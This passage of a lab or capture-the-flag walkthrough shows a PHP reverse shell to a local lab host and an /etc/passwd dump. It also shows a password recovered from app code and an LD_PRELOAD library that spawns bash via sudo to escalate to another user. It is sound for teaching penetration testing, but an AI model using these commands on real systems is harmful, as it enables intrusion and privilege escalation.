&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/bin\/php -r &amp;#39;$sock=fsockopen(\&amp;quot;192.168.56.1\&amp;quot;,8080);exec(\&amp;quot;\/bin\/sh -i &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;4 2&amp;gt;&amp;amp;4\&amp;quot;);&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It works with no more restriction:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh-4.2$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=998(nginx) gid=997(nginx) groups=997(nginx)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="batman-and-robin"&gt;Batman and Robin?&lt;/h3&gt;
&lt;p&gt;We can get a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:1:1:bin:/bin:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:2:2:daemon:/sbin:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;adm:x:3:4:adm:/var/adm:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:5:0:sync:/sbin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown&lt;/span&gt;
&lt;span class="code-line"&gt;halt:x:7:0:halt:/sbin:/sbin/halt&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:12:mail:/var/spool/mail:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;operator:x:11:0:operator:/root:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:12:100:games:/usr/games:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:99:99:Nobody:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;dbus:x:81:81:System message bus:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;polkitd:x:999:998:User for polkitd:/:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;postfix:x:89:89::/var/spool/postfix:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nginx:x:998:997:Nginx web server:/var/lib/nginx:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;robin:x:1000:1000::/home/robin:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;bryan:x:1001:1001::/home/bryan:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;sean:x:1002:1002::/home/sean:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can see in the &lt;code&gt;/etc/passwd&lt;/code&gt; file that there is 3 users: robin, bryan and
sean. Moreover in the &lt;code&gt;CommandActivity.java&lt;/code&gt; file we have seen that there is a
mean to execute ssh command (also the port is not open) using the user robin.
The password used for this command is a simply a XOR between the
&lt;code&gt;integryity_check&lt;/code&gt; base64 encoded string at the beginning of the file and the
string define in the validate method. We can reuse the code from there and find
back the password: 40373df4b7a1f413af61cf7fd06d03a565a51898&lt;/p&gt;
&lt;p&gt;With our reverse shell a simple &lt;code&gt;su robin&lt;/code&gt; and the password above give us a shell
as the robin user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(robin) gid=1000(robin) groups=1000(robin)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="where-is-bryan"&gt;Where is bryan?&lt;/h3&gt;
&lt;p&gt;For the next part of the challenge we may need a real pty shell, Once more
&lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
will help us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go in the user directory (&lt;code&gt;cd&lt;/code&gt;) and we see a file &lt;code&gt;debug.gpg&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat debug.gpg&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN PGP SIGNED MESSAGE-----&lt;/span&gt;
&lt;span class="code-line"&gt;Hash: SHA1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Dude,&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;I know you are trying to debug this stupid dice thing, so I figured the below&lt;/span&gt;
&lt;span class="code-line"&gt;will be useful?&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[...]&lt;/span&gt;
&lt;span class="code-line"&gt;__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &amp;lt;unfinished ...&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;getenv(&amp;quot;LD_PRELOAD&amp;quot;)                                                                                          = nil&lt;/span&gt;
&lt;span class="code-line"&gt;rand()                                                                                                        = 1804289383&lt;/span&gt;
&lt;span class="code-line"&gt;__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22&lt;/span&gt;
&lt;span class="code-line"&gt;__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290&lt;/span&gt;
&lt;span class="code-line"&gt;+++ exited (status 0) +++Dice said: 1804289383&lt;/span&gt;
&lt;span class="code-line"&gt;[...]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Lemme know!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;- --&lt;/span&gt;
&lt;span class="code-line"&gt;Sean&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We search for the dice program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;find / -name &amp;#39;dice&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/local/bin/dice&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This program simply roll a dice:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/local/bin/dice&lt;/span&gt;
&lt;span class="code-line"&gt;Dice said: 1804289383&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;An other useful information is that we can roll the dice as bryan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for robin on this host:&lt;/span&gt;
&lt;span class="code-line"&gt;    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS&lt;/span&gt;
&lt;span class="code-line"&gt;    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1&lt;/span&gt;
&lt;span class="code-line"&gt;    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE&lt;/span&gt;
&lt;span class="code-line"&gt;    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY&lt;/span&gt;
&lt;span class="code-line"&gt;    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL&lt;/span&gt;
&lt;span class="code-line"&gt;    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;, env_keep+=LD_PRELOAD,&lt;/span&gt;
&lt;span class="code-line"&gt;    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User robin may run the following commands on this host:&lt;/span&gt;
&lt;span class="code-line"&gt;    (bryan) /usr/local/bin/dice&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us put all the pieces together. We can run the program as bryan, we now that
the program load the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environement variable.&lt;/p&gt;
&lt;p&gt;A simple google search lead us to
&lt;a href="http://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/"&gt;this article&lt;/a&gt;
and
&lt;a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/"&gt;this one&lt;/a&gt;.
So now we just need to write a shared library to replace &lt;code&gt;rand()&lt;/code&gt; by &lt;code&gt;/bin/bash&lt;/code&gt;
run the program as bryan and we would get a shell as bryan.&lt;/p&gt;
&lt;p&gt;When testing the trick I ran into the following error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so&lt;/span&gt;
&lt;span class="code-line"&gt;gcc: error trying to exec &amp;#39;cc1&amp;#39;: execvp: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We just need to add some variable to our user's PATH:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/game&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;From there we we can compile the shared library and execute the dice program
with it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so&lt;/span&gt;
&lt;span class="code-line"&gt;gcc -shared -fPIC unrandom.c -o unrandom.so&lt;/span&gt;
&lt;span class="code-line"&gt;[robin@fII ~]$ LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice&lt;/span&gt;
&lt;span class="code-line"&gt;LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice&lt;/span&gt;
&lt;span class="code-line"&gt;42 baby&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to copy the &lt;code&gt;.so&lt;/code&gt; to a location where bryan could read it like &lt;code&gt;/tmp/&lt;/code&gt;.
Now we can run the program as bryan and load the shared library:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;unrandom&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dice&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;robin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;40373&lt;/span&gt;&lt;span class="n"&gt;df4b7a1f413af61cf7fd06d03a565a51898&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;baby&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to modify the code to get a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb nb-Type"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;most&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;universe&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We compile it with &lt;code&gt;gcc&lt;/code&gt; and run it as bryan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;robin@fII ~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lol&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dice&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lol&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dice&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;robin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;40373&lt;/span&gt;&lt;span class="n"&gt;df4b7a1f413af61cf7fd06d03a565a51898&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII robin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="sean"&gt;sean&lt;/h3&gt;
&lt;p&gt;Now that we have a shell as bryan we may execute the &lt;code&gt;backup&lt;/code&gt; script own by
sean with the SUID set:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1960&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwsr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;8830&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;backup&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
